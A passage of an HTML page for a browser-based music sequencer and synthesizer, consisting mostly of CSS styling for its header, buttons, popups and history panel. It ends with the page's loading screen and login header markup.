1 2 0V82h-28.1zm16-64a5 5 0 1 1 0-2H146v44.1a5 5 0 1 1-2 0V18h-26.1zm102.2 270a5 5 0 1 1 0 2H98v14h-2v-16h124.1zM242 149.9V160h16v34h-16v62h48v48h-2v-46h-48v-66h16v-30h-16v-12.1a5 5 0 1 1 2 0zM53.9 18a5 5 0 1 1 0-2H64V2H48V0h18v18H53.9zm112 32a5 5 0 1 1 0-2H192V0h50v2h-48v48h-28.1zm-48-48a5 5 0 0 1-9.8-2h2.07a3 3 0 1 0 5.66 0H178v34h-18V21.9a5 5 0 1 1 2 0V32h14V2h-58.1zm0 96a5 5 0 1 1 0-2H137l32-32h39V21.9a5 5 0 1 1 2 0V66h-40.17l-32 32H117.9zm28.1 90.1a5 5 0 1 1-2 0v-76.51L175.59 80H224V21.9a5 5 0 1 1 2 0V82h-49.59L146 112.41v75.69zm16 32a5 5 0 1 1-2 0v-99.51L184.59 96H300.1a5 5 0 0 1 3.9-3.9v2.07a3 3 0 0 0 0 5.66v2.07a5 5 0 0 1-3.9-3.9H185.41L162 121.41v98.69zm-144-64a5 5 0 1 1-2 0v-3.51l48-48V48h32V0h2v50H66v55.41l-48 48v2.69zM50 53.9v43.51l-48 48V208h26.1a5 5 0 1 1 0 2H0v-65.41l48-48V53.9a5 5 0 1 1 2 0zm-16 16V89.41l-34 34v-2.82l32-32V69.9a5 5 0 1 1 2 0zM12.1 32a5 5 0 1 1 0 2H9.41L0 43.41V40.6L8.59 32h3.51zm265.8 18a5 5 0 1 1 0-2h18.69l7.41-7.41v2.82L297.41 50H277.9zm-16 160a5 5 0 1 1 0-2H288v-71.41l16-16v2.82l-14 14V210h-28.1zm-208 32a5 5 0 1 1 0-2H64v-22.59L40.59 194H21.9a5 5 0 1 1 0-2H41.41L66 216.59V242H53.9zm150.2 14a5 5 0 1 1 0 2H96v-56.6L56.6 162H37.9a5 5 0 1 1 0-2h19.5L98 200.6V256h106.1zm-150.2 2a5 5 0 1 1 0-2H80v-46.59L48.59 178H21.9a5 5 0 1 1 0-2H49.41L82 208.59V258H53.9zM34 39.8v1.61L9.41 66H0v-2h8.59L32 40.59V0h2v39.8zM2 300.1a5 5 0 0 1 3.9 3.9H3.83A3 3 0 0 0 0 302.17V256h18v48h-2v-46H2v42.1zM34 241v63h-2v-62H0v-2h34v1zM17 18H0v-2h16V0h2v18h-1zm273-2h14v2h-16V0h2v16zm-32 273v15h-2v-14h-14v14h-2v-16h18v1zM0 92.1A5.02 5.02 0 0 1 6 97a5 5 0 0 1-6 4.9v-2.07a3 3 0 1 0 0-5.66V92.1zM80 272h2v32h-2v-32zm37.9 32h-2.07a3 3 0 0 0-5.66 0h-2.07a5 5 0 0 1 9.8 0zM5.9 0A5.02 5.02 0 0 1 0 5.9V3.83A3 3 0 0 0 3.83 0H5.9zm294.2 0h2.07A3 3 0 0 0 304 3.83V5.9a5 5 0 0 1-3.9-5.9zm3.9 300.1v2.07a3 3 0 0 0-1.83 1.83h-2.07a5 5 0 0 1 3.9-3.9zM97 100a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-48 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 96a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-144a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM49 36a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM33 68a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 240a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm80-176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm112 176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 180a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 84a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'%3E%3C/path%3E%3C/svg%3E" );
	background-attachment: local;
	--gsuiWindows-overflow: auto;
}

#noscript {
	position: absolute;
	display: flex;
	align-items: center;
	justify-content: center;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	z-index: 2147483647;
	color: #ddd;
	background-color: #333;
}
#head {
	position: relative;
	display: grid;
	z-index: 1000; /* 1. */
	color: #ddd;
	font-size: 16px;
	padding: var( --head-gap );
	grid-gap: var( --head-gap );
	grid-template:
		"header ctrlA       ctrlB       .   headHelp  " var( --head-heightA )
		"cmp    currentTime winBtns     .   headVersion" var( --head-heightB )
		/260px  min-content min-content 1fr min-content;
	background-color: var( --head-bg );
	border-bottom: var( --head-border );
}

/* .......................................................................... */
a.btn {
	display: inline-flex;
	align-items: center;
	justify-content: center;
}
.btn {
	border: 0;
	padding: 0;
	outline: 0;
	color: inherit;
	cursor: pointer;
	font-size: inherit;
	border-radius: 4px;
	background: none;
	transition: var( --head-hover-dur );
	transition-property: color, opacity, background-color;
	user-select: none;
}
.btn:not( .gsuiIcon ) {
	font-family: inherit;
}
.btnMarge + .btnMarge {
	margin-left: var( --head-gap );
}
.btn:focus {
	z-index: 1;
	position: relative;
	box-shadow: 0 0 1px 2px #69b;
}
.btn.gsuiIcon:focus,
.btn.gsuiIcon:hover {
	color: #fff;
}
.btnBg {
	background-color: #ffffff1a;
}
.btnBg:focus,
.btnBg:hover {
	background-color: #fff3;
}
.btnLarge {
	width: var( --head-heightA );
	min-width: var( --head-heightA );
}
.btnIconLarge {
	font-size: calc( var( --head-heightA ) - 8px );
}

/* .......................................................................... */
.btnGroup .btn:first-of-type {
	border-top-left-radius: 4px;
	border-bottom-left-radius: 4px;
}
.btnGroup .btn:last-of-type {
	border-top-right-radius: 4px;
	border-bottom-right-radius: 4px;
}
.btnGroup .btn {
	margin-left: 0;
	border-radius: 0;
	transition: color var( --head-hover-dur );
}
.btnGroup .btn:hover {
	color: #fff;
}

/* .......................................................................... */
#header {
	grid-area: header;
	display: flex;
}
#title {
	align-self: center;
	font-size: 28px;
	font-family: var( --font-oswald );
	margin-right: 4px;
}
#title::before {
	content: attr( data-text );
}
#headUser {
	border: 2px solid #222;
	box-sizing: border-box;
	margin-left: var( --head-gap );
	background-size: cover;
	background-color: rgba( 255, 255, 255, .3 );
}
#app.logged #login,
#app:not( .logged ) #logout,
#app:not( .logged ) #headUser {
	display: none;
}
#login,
#logout {
	margin-left: 4px;
	opacity: .7;
}

/* .......................................................................... */
#cmpsBtn {
	display: flex;
	align-items: center;
	justify-content: center;
	height: 100%;
	margin-left: 4px;
	color: var( --head-cmps-btn );
}
#cmpsBtn .gsuiIcon[ data-icon="plus" ] {
	margin-left: 4px;
	font-size: 14px;
}
#cmpsBtn:focus,
#cmpsBtn:hover {
	color: var( --head-bg );
	background-color: var( --head-cmps-btn );
}

/* .......................................................................... */
#headCmp {
	grid-area: cmp;
	display: flex;
	overflow: hidden;
	border-radius: 4px;
	line-height: var( --head-heightB );
	background-color: var( --cmp-local-bg );
}
#headCmpSave {
	border-radius: 0;
}
#headCmpInfo {
	flex: 1;
	display: flex;
	overflow: hidden;
	align-items: center;
	padding: 0 4px;
	font-size: 14px;
}
#headCmpName {
	overflow: hidden;
	white-space: nowrap;
	text-overflow: ellipsis;
	text-align: left;
	padding-right: .4ch;
}
#headCmpIcon {
	display: none;
	margin-right: .3em;
}
#headCmp.cmp-saved #headCmpIcon {
	display: inline-block;
}
#headCmp:not( .cmp-saved ) #headCmpName::before {
	content: "*";
}
#headCmpName:empty::after {
	content: "Untitled";
	font-style: italic;
	padding-right: 1px;
	opacity: .8;
}
#headCmpHover {
	width: 0;
	display: inline-block;
	overflow: hidden;
	position: relative;
	transition: .1s;
	transition-property: width, margin-left;
}
#headCmpInfo:focus #headCmpHover,
#headCmpInfo:hover #headCmpHover {
	width: 1.4ch;
	margin-left: 4px;
}
#headCmpDur::before {
	content: "?";
	margin: 4px;
}

/* .......................................................................... */
#headGain {
	width: 6px;
	--gsuiSlider-lineRadius: 4px;
	--gsuiSlider-lineColor: var( --ctrl-play-bg );
	--gsuiSlider-lineBgColor: #222;
}
#headGain .gsuiSlider-eventCatcher {
	left: -12px;
	right: -4px;
}

/* .......................................................................... */
#headCurrentTime {
	grid-area: currentTime;
	padding: 10px;
	border-radius: 4px;
	background-color: var( --ctrl-currentTime-bg );
	--gsuiSlider-lineColor: var( --ctrl-currentTime-color );
	--gsuiSlider-lineBgColor: #222;
}
#headCurrentTime .gsuiSlider-eventCatcher {
	top: -10px;
	left: -10px;
	right: -10px;
	bottom: -10px;
}

/* .......................................................................... */
#ctrlA {
	grid-area: ctrlA;
	display: flex;
}

/* .......................................................................... */
#headPlay {
	display: flex;
}
.playBtn {
	background-color: var( --ctrl-play-bg );
}
#playToggle {
	padding: 6px 5px 6px 7px;
	display: flex;
	overflow: hidden;
	align-items: center;
	flex-direction: column;
	justify-content: space-between;
}
#playToggle span {
	width: 8px;
	height: 8px;
	box-sizing: border-box;
	border: 2px solid;
	border-radius: 2px;
}
#playToggle[ data-dir="up" ] span:first-child,
#playToggle[ data-dir="down" ] span:last-child {
	background-color: currentColor;
}
#stop {
	margin-left: -3px;
}

/* .......................................................................... */
#headTempo {
	display: flex;
	align-items: center;
	white-space: nowrap;
	background-color: #222;
}
#timeSignature {
	display: flex;
	align-items: center;
	flex-direction: column;
	justify-content: space-between;
	height: 40%;
	padding: 0 6px 0 8px;
	font-size: 14px;
	line-height: 0;
	font-family: var( --font-number );
}
#bpm {
	display: flex;
	align-items: baseline;
	padding-right: 7px;
	font-size: var( --bpm-fontSize );
	font-family: var( --font-number );
}
#bpm::after {
	content: "bpm";
	margin-left: 2px;
	font-size: 14px;
	opacity: .5;
}

/* .......................................................................... */
#ctrlB {
	grid-area: ctrlB;
	display: flex;
}

/* .......................................................................... */
#headHist {
	display: inline-flex;
	user-select: none;
}
#headHist .btn {
	background-color: #777;
}
#redo {
	margin-left: -4px;
}
#undoMore {
	padding: 0 6px 0 3px;
}

/* .......................................................................... */
#headAnalyser {
	width: 140px;
	border-radius: 4px;
	background-color: #000;
	filter: saturate( .5 ) contrast( .76 );
}

/* .......................................................................... */
#headExport {
	color: var( --ctrl-render-color );
}

/* .......................................................................... */
#winBtns {
	grid-area: winBtns;
	display: flex;
	white-space: nowrap;
}
.winBtn {
	padding: 2px 6px;
	font-size: 12px;
	font-weight: bold;
	border-radius: 0;
	background-color: var( --head-winBtn-bg );
	transition: var( --head-hover-dur );
	transition-property: color, background-color, box-shadow;
}
.winBtn:first-child {
	border-top-left-radius: 4px;
	border-bottom-left-radius: 4px;
}
.winBtn:last-child {
	border-top-right-radius: 4px;
	border-bottom-right-radius: 4px;
}
.winBtn + .winBtn {
	margin-left: 0;
	border-left: 1px dashed rgba( 0, 0, 0, .2 );
}
.winBtn-open {
	color: var( --head-bg );
	background-color: var( --head-winBtn-open-bg );
}
.winBtn::before {
	content: attr( data-text );
}

/* .......................................................................... */
#headHelp {
	grid-area: headHelp;
	display: flex;
}
#cookies {
	animation: infinite cookie-anim 5s;
}
#helpAbout {
	color: var( --ctrl-about-color );
}

@keyframes cookie-anim {
	30% { box-shadow: none; }
	35% { box-shadow: 0 0 0 3px var( --ctrl-eatcookie-color ); }
	100% { box-shadow: 0 0 0 3px transparent; }
}

/* .......................................................................... */
#headVersion {
	display: flex;
	align-items: center;
	justify-content: flex-end;
	grid-area: headVersion;
	user-select: none;
}
#headVersionBtn {
	display: flex;
	align-items: center;
	border: 0;
	padding: 0;
	outline: 0;
	border-radius: 4px;
	font-size: 18px;
	color: inherit;
	cursor: pointer;
	opacity: .3;
	background: none;
	transition: opacity var( --head-hover-dur );
}
#headVersionBtn:focus {
	box-shadow: 0 0 1px 2px #69b;
}
#headVersionBtn:focus,
#headVersionBtn:hover {
	opacity: 1;
}
#headVersionNum {
	margin-left: 6px;
	font-family: var( --font-number );
}

/*
	1. z-index: 1000 to be on top on all the windows possible.
*/
#cmps {
	left: var( --head-gap );
	width: 480px;
	grid-template-columns: 1fr 1fr;
	box-shadow: 12px var( --head-dropdown-shadow );
}

#cmps .windowBtn {
	color: var( --windowBtn-newCmp-color );
	margin-left: 8px;
}

#cmpsCloudList {
	border-left: 1px solid #444;
}

#app:not( .logged ) #cmpsCloudList .placeholder span:first-child,
#app.logged         #cmpsCloudList .placeholder span:last-child {
	display: none;
}
#app:not( .logged ) #cloudNewCmp {
	color: #888;
}
.popup {
	width: 500px;
}

/* .popup *content* --------------------------------------------------------- */
.popup fieldset {
	border: 2px solid #444;
	border-radius: 4px;
	margin-bottom: 10px;
}

.popup legend {
	font-size: 12px;
	opacity: .5;
}

.popup a {
	color: #707099;
}

.popup-error-msg {
	margin-top: 12px;
	font-size: 12px;
	color: #ed9a8b;
}
.popup-error-msg:empty {
	display: none;
}

.popup .param {
	display: flex;
	align-items: center;
	font-size: 14px;
}
.popup .param + .param {
	margin-top: 6px;
}

.popup .param-title {
	flex: 1;
}
.popup .param-values {
	display: flex;
	align-items: center;
	font-family: var( --font-monospace );
}
.popup .param-column {
	flex-direction: column;
}

.popup label {
	display: flex;
	align-items: center;
}
.popup input[ type="radio" ]:checked + label {
	font-weight: bold;
}

.popup input,
.popup button {
	border-radius: 2px;
	border: 0;
	color: inherit;
	font-size: inherit;
}
.popup input::placeholder {
	color: #aaa;
	font-style: italic;
}
.popup input[ type="radio" ],
.popup input[ type="checkbox" ] {
	margin-right: 8px;
	transform: scale( 1.5 );
}
.popup input[ type="range" ] {
	min-width: 0;
}

.popup input[ type="password" ],
.popup input[ type="number" ],
.popup input[ type="text" ],
.popup input[ type="url" ],
.popup input[ type="file" ] {
	width: 180px;
	height: 32px;
	padding: 0 8px;
	box-sizing: border-box;
	font-family: inherit;
	background-color: rgba( 255, 255, 255, .1 );
}
.popup input[ type="file" ] {
	width: 200px;
	height: auto;
	padding-top: 6px;
	padding-bottom: 6px;
}

/* #authPopupContent -------------------------------------------------------- */
#authPopupContent {
	width: 340px;
}
#authPopupContent a {
	font-size: 12px;
}

/* #selectChanPopupContent ---------------------------------------------------- */
#selectChanPopupContent,
#gsuiPatterns-selectChanPopupContent {
	width: auto;
}
#selectChanPopupSelect,
#gsuiPatterns-selectChanPopupSelect {
	width: 100%;
	color: inherit;
	background-color: transparent;
}
#selectChanPopupSelect option,
#gsuiPatterns-selectChanPopupSelect option {
	padding: 4px;
}

/* #tempoPopupContent ---------------------------------------------------- */
#tempoPopupContent {
	width: 400px;
}
#tempoBPM {
	width: calc( 180px - 6px - 32px );
}
#tempoBPMTap {
	display: flex;
	align-self: normal;
	align-items: center;
	justify-content: center;
	cursor: pointer;
	color: inherit;
	width: 32px;
	font-size: 18px;
	margin-left: 6px;
	border-radius: 2px;
	background-color: rgba( 255, 255, 255, .1 );
}
#tempoBPMTap:hover {
	background-color: rgba( 255, 255, 255, .2 );
}

/* #shortcutsPopupContent --------------------------------------------------- */
#shortcutsPopupContent .param {
	padding: 4px;
}
#shortcutsPopupContent .param:nth-child( even ) {
	background-color: rgba( 255, 255, 255, .05 );
}

#shortcutsPopupContent .param-title {
	font-size: 13px;
}

#shortcutsPopupContent .shortcuts {
	display: inline-block;
	position: relative;
	border-radius: 4px;
	border-bottom: 3px solid #333;
	padding: 4px 6px;
	color: #fff;
	white-space: nowrap;
	background: #B82587;
}
#shortcutsPopupContent .shortcuts-sep {
	margin: 0 8px;
	font-size: 10px;
}
#shortcutsPopupContent .shortcuts .icon {
	width: auto;
}

/* #renderPopupContent ------------------------------------------------------- */
#renderWrap {
	display: flex;
	padding: 10px 0;
}
#renderProgress {
	flex: 1;
	height: 28px;
}
#renderBtn {
	padding: 0 .8em;
	border-radius: 2px;
	margin-right: 10px;
	color: #20BF9F;
	font-size: 12px;
	line-height: 28px;
	font-weight: bold;
	background-color: #00F7FF;
}
#renderBtn > span { display: none; }
#renderBtn[ data-status="0" ] #renderBtn0 { display: inline; }
#renderBtn[ data-status="1" ] #renderBtn1 { display: inline; }
#renderBtn[ data-status="2" ] #renderBtn2 { display: inline; }
#renderBtn .gsuiIcon {
	margin-left: .3em;
}

/* #settingsPopupContent ---------------------------------------------------- */
#settingsPopupContent {
	width: 400px;
}
#settingsPopupContent .param-values {
	width: 200px;
}
.settingsPopupFps {
	font-size: 16px;
}
.settingsPopupFps::after {
	content: " fps";
	font-family: var( --font-default );
	font-size: 12px;
	opacity: .6;
}
#settingsUIRateManual {
	flex: 1;
	margin-left: 8px;
}

/* #aboutPopupContent ------------------------------------------------------- */
#aboutPopupContent {
	width: 450px;
	text-align: center;
}
#aboutPopupContent > div {
	margin-bottom: 16px;
}

#aboutPopupContent .title {
	display: flex;
	align-items: baseline;
	justify-content: center;
}
#aboutPopupContent .title > span:first-child {
	margin-right: 4px;
	font: 32px var( --font-oswald );
}

#aboutPopupContent a {
	color: #ccf;
	font-weight: bold;
}

#aboutPopupContent .social-network {
	display: flex;
}

#aboutPopupContent .social-network a {
	flex: 1;
	padding: 20px 0;
	color: #fff;
	font-size: 36px;
	font-weight: normal;
	opacity: .5;
	transition: .4s;
	transition-property: opacity;
}
#aboutPopupContent .social-network a:hover {
	opacity: 1;
}
#aboutPopupContent .social-network a:hover::before {
	top: -4px;
	left: 4px;
	text-shadow: -4px 4px 2px rgba( 0, 0, 0, .2 );
}
#aboutPopupContent .social-network a::before {
	position: relative;
	top: 0;
	left: 0;
	transition: .2s;
	transition-property: top, left, text-shadow;
}
#aboutPopupContent .social-network:hover a:not( :hover ) {
	opacity: .3;
}
.gsuiWindow[ data-window-id="mixer" ] .gsuiWindow-content {
	overflow-y: hidden;
}

/* .......................................................................... */
.windowBetaMsg {
	color: #fff;
	padding: 8px;
	font-size: 11px;
	font-weight: bold;
	background: #B82587;
}

/* .......................................................................... */
.windowBtn {
	height: 20px;
	padding: 0 8px;
	max-width: 110px;
	border: 0;
	outline: 0;
	cursor: pointer;
	overflow: hidden;
	border-radius: 3px;
	line-height: 1;
	color: inherit;
	font-size: 12px;
	font-weight: bold;
	font-family: inherit;
	white-space: nowrap;
	text-overflow: ellipsis;
	background-color: var( --windowBtn-bg );
	transition: filter .2s;
}
.windowBtn:focus,
.windowBtn:hover {
	filter: brightness( 1.1 );
}

.windowBtnIcon,
.windowBtnText {
	pointer-events: none;
}

.windowBtnIcon + .windowBtnText {
	margin-left: 4px;
}

.windowDataBtn:empty::before {
	content: "Untitled";
	font-style: italic;
}
#channelName,
#synthChannelBtn { color: var( --windowBtn-chan-color ); }
#drumsNew,
#drumsName,
#pianorollName { color: var( --windowBtn-pattern-color ); }
#synthName { color: var( --windowBtn-synth-color ); }
#synthChanName {
	margin: 0;
	padding-right: 4px;
	border-top-right-radius: 0;
	border-bottom-right-radius: 0;
}

/* .......................................................................... */
#synthDestArrow {
	margin: 0 6px;
	pointer-events: none;
}

/* .......................................................................... */
.gsuiDrums,
.gsuiPianoroll,
.gsuiPatternroll,
.gsuiSynthesizer {
	height: 100%;
	outline: 0;
}
.cmp {
	box-sizing: border-box;
	display: flex;
	color: var( --cmp-text );
	height: var( --cmp-height );
	font-size: var( --cmp-text-size );
	line-height: var( --cmp-height );
	background-color: var( --cmp-bg );
	filter: brightness( .9 );
}
#cmpsLocalList .cmp { --cmp-bg: var( --cmp-local-bg ); }
#cmpsCloudList .cmp { --cmp-bg: var( --cmp-cloud-bg ); }
.cmp:nth-child( odd ) {
	filter: brightness( .85 );
}
.cmp.cmp-loaded {
	filter: none;
}
.cmp-loading {
	pointer-events: none;
}

/* .......................................................................... */
.cmp-btn {
	border: 0;
	color: inherit;
	cursor: pointer;
	font-size: 16px;
	background: none;
}
.cmp-btn-light {
	opacity: .7;
	padding: 0 8px;
	transition: .2s opacity;
}
.cmp-btn-light:focus,
.cmp-btn-light:hover {
	opacity: 1;
}

/* .......................................................................... */
.cmp-save {
	width: 32px;
	background-color: var( --cmp-save-bg );
	transition: .2s;
	transition-property: margin-left, color, background-color, visibility;
}
.cmp-saved .cmp-save {
	visibility: hidden;
	margin-left: -32px;
}
.cmp-save.cmp-save:focus,
.cmp-save.cmp-save:hover {
	color: var( --cmp-save-bg );
	background-color: var( --cmp-text );
}

/* .......................................................................... */
.cmp-info {
	flex: 1;
	display: flex;
	align-items: flex-start;
	flex-direction: column;
	justify-content: space-between;
	padding: 6px 6px 4px;
	overflow: hidden;
	font-size: 13px;
	line-height: 1em;
	transition: .2s;
	transition-property: padding-left, opacity;
	opacity: .7;
}
.cmp-info:focus,
.cmp-info:hover,
.cmp-loaded .cmp-info {
	opacity: 1;
}
.cmp-info > div {
	pointer-events: none;
	white-space: nowrap;
	text-overflow: ellipsis;
	overflow: hidden;
}

/* .......................................................................... */
.cmp-name {
	max-width: 100%;
	font-weight: bold;
	border-radius: 2px;
	padding-right: .4ch;
	transition: .2s;
	transition-property: box-shadow, color, background-color;
}
.cmp-info:focus .cmp-name,
.cmp-info:hover .cmp-name {
	color: var( --cmp-bg );
	box-shadow: 0 0 0 2px var( --cmp-text );
	background-color: var( --cmp-text );
}
.cmp:not( .cmp-saved ) .cmp-name::before {
	content: "*";
}
.cmp-name:empty::after {
	font-style: italic;
	content: "Untitled";
}

/* .......................................................................... */
.cmp-bpm-wrap,
.cmp-duration-wrap {
	display: inline-flex;
	align-items: center;
	font: 14px var( --font-number );
}
.cmp-duration-wrap {
	margin-right: 10px;
}
.cmp-info .gsuiIcon {
	margin-right: 4px;
	opacity: .4;
}
#history {
	left: 420px;
	width: 360px;
	box-shadow: 2px var( --head-dropdown-shadow );
}
#version {
	font-size: 18px;
}

#versionNum {
	opacity: .8;
	font-family: var( --font-number );
}

#versionCheck {
	font-size: 11px;
	font-weight: bold;
	opacity: .4;
	cursor: pointer;
	transition: .2s opacity;
}
#versionCheck:hover {
	opacity: 1;
}
.placeholder {
	display: none;
	height: 100%;
	box-sizing: border-box;
	align-items: center;
	justify-content: center;
	padding: 1em;
	text-align: center;
	font-size: 12px;
	opacity: .5;
	user-select: none;
}
.placeholder:only-child {
	display: flex;
}
.headDropdown {
	position: absolute;
	overflow: hidden;
	display: grid;
	height: 320px;
	grid-template-rows: 32px 1fr;
	box-sizing: border-box;
	top: calc( 100% + var( --head-gap ) );
	z-index: 1;
	outline: 0;
	border: 2px solid #444;
	border-radius: 4px;
	transition: .2s;
	transition-property: opacity, visibility;
}
.headDropdown:focus {
	border-color: #69b;
}
.headDropdown:focus-within {
	z-index: 2;
}
.headDropdown-btn:not( :focus ) + .headDropdown:not( :focus-within ) {
	opacity: 0;
	visibility: hidden;
}

.headDropdown-head {
	display: flex;
	align-items: center;
	color: #222;
	font-size: 14px;
	background-color: #888;
	user-select: none;
}
.headDropdown-icon {
	margin: 0 6px;
	font-size: 16px;
}
.headDropdown-title {
	font-weight: bold;
}

.headDropdown-list {
	overflow: auto;
	background-color: #C9C9C9;
}

.headDropdown-backdrop {
	position: absolute;
	top: 68px;
	left: 0;
	right: 0;
	bottom: -1000px;
	opacity: 0;
	visibility: hidden;
	backdrop-filter: blur( 10px );
	background-color: #0009;
	transition: .4s;
	transition-property: visibility, opacity;
}
.headDropdown-btn:focus ~ .headDropdown-backdrop,
.headDropdown:focus-within + .headDropdown-backdrop {
	visibility: visible;
	opacity: 1;
}
.historyAction {
	display: flex;
	box-sizing: border-box;
	align-items: center;
	cursor: pointer;
	height: 30px;
	padding: 0 6px;
	color: var( --history-action-text );
	font-size: 14px;
	font-family: var( --font-monospace );
	background-color: var( --history-action-bg );
	transition: filter .2s;
}
.historyAction:hover {
	filter: brightness( 1.3 );
}

/* -------------------------------------------------------------------------- */
.historyAction::before {
	content: "";
	display: block;
	width: 6px;
	height: 6px;
	border-radius: 50%;
	transition: inherit;
	background-color: var( --history-actionlight-bg );
}
.historyAction-undone:not( :hover )::before {
	background-color: var( --history-actionlightoff-bg );
}

/* -------------------------------------------------------------------------- */
.historyAction-icon {
	width: 1.4ch;
	margin: 0 6px;
	text-align: center;
}
.historyAction-text {
	flex: 1;
	overflow: hidden;
	text-overflow: ellipsis;
	white-space: nowrap;
	transition-duration: inherit;
	transition-property: opacity;
}
.historyAction-undone .historyAction-icon,
.historyAction-undone .historyAction-text {
	opacity: .6;
}
#pianorollForbidden {
	position: absolute;
	z-index: 2000000; /* 1. */
	top: 0;
	width: 100%;
	height: 100%;
	display: flex;
	overflow: hidden;
	align-items: center;
	justify-content: center;
	background: #B818A3;
	transition: .2s;
	transition-property: opacity, visibility;
}
#pianorollForbidden.hidden {
	opacity: 0;
	visibility: hidden;
}
#pianorollForbidden::before {
	content: "No pattern selected...";
	display: block;
	padding: 18px;
	color: #ddd;
	font-size: 12px;
	font-style: italic;
	font-weight: bold;
	border-radius: 4px;
	background-color: rgba( 255, 255, 255, .1 );
}

/*
1.
	z-index: 2000000; because of gsuiSliderGroup
*/
</style>
</head>
<body>

<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M2VH8NR"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

<noscript id="noscript">SquencerSynthisizer needs JavaScript to run</noscript>
<div id="loading">
	<div id="loadingContent">
		<div class="TextGlitch" id="gsTitle">
			<div class="TextGlitch-clip">
				<div class="TextGlitch-word">SquencerSynthisizer v.1.5 "open Beginner"</div>
				<div class="TextGlitch-word TextGlitch-blend TextGlitch-blendA"></div>
				<div class="TextGlitch-word TextGlitch-blend TextGlitch-blendB"></div>
			</div>
			<div class="TextGlitch-clip">
				<div class="TextGlitch-word"></div>
				<div class="TextGlitch-word TextGlitch-blend TextGlitch-blendA"></div>
				<div class="TextGlitch-word TextGlitch-blend TextGlitch-blendB"></div>
			</div>
			<div class="TextGlitch-clip">
				<div class="TextGlitch-word"></div>
				<div class="TextGlitch-word TextGlitch-blend TextGlitch-blendA"></div>
				<div class="TextGlitch-word TextGlitch-blend TextGlitch-blendB"></div>
			</div>
		</div>
		<span id="loadingLoading">loading...</span>
		<span id="loadingLoaded">click to start</span>
		<span id="loadingStarting">starting...</span>
	</div>
</div>
<div id="app">
	<!--#head-->
	<div id="body"></div>
</div>
<div id="head">
	<div id="header">
		<span id="title" data-text="Squencer" data-text-s="GS"></span>
		<a class="btn btnLarge headBtn" href id="headUser" title="Cloud profile" target="_blank" rel="noopener"></a>
		<button class="btn btnLarge headBtn btnIconLarge gsuiIcon" id="login" data-icon="profile" title="Login to Squencer"></button>
		<button class="btn btnLarge headBtn btnIconLarge gsuiIcon" id="logout" data-icon="logout" title="Logout"></button>
		<div id="headCmps">
